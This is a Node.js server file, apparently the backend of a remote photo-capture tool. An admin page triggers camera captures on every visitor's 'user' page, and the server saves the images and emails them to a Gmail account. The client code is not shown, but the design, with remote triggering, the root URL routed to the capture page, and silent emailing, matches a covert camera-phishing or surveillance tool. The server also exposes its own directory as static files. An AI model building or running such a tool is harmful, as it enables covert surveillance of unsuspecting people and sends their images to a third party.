const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Folder setup for local uploads
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// Serve static files from root AND public folder
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadDir));

// Gmail Config (Apne Passwords aur ID ke sath check kar lein)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'YOUR_GMAIL@gmail.com', 
        pass: 'YOUR_GMAIL_APP_PASSWORD'
    }
});

// Helper function to find file location (root vs public)
const getFilePath = (fileName) => {
    const publicPath = path.join(__dirname, 'public', fileName);
    if (fs.existsSync(publicPath)) return publicPath;
    return path.join(__dirname, fileName);
};

// 1. Root URL -> Direct User Page
app.get('/', (req, res) => {
    res.sendFile(getFilePath('user.html'));
});

// 2. Explicit User Route
app.get('/user.html', (req, res) => {
    res.sendFile(getFilePath('user.html'));
});

// 3. Explicit Admin Route
app.get('/admin.html', (req, res) => {
    res.sendFile(getFilePath('admin.html'));
});

io.on('connection', (socket) => {
    console.log('⚡ Connected Device ID:', socket.id);

    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
        });

        io.emit('send-photo-to-admin', imageData);

        const mailOptions = {
            from: 'YOUR_GMAIL@gmail.com',
            to: 'YOUR_GMAIL@gmail.com',
            subject: '📸 New Photo Captured!',
            text: 'User page se nayi photo capture hui hai.',
            attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) console.log('❌ Email Send Error:', error);
            else console.log('📧 Email Sent:', info.response);
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});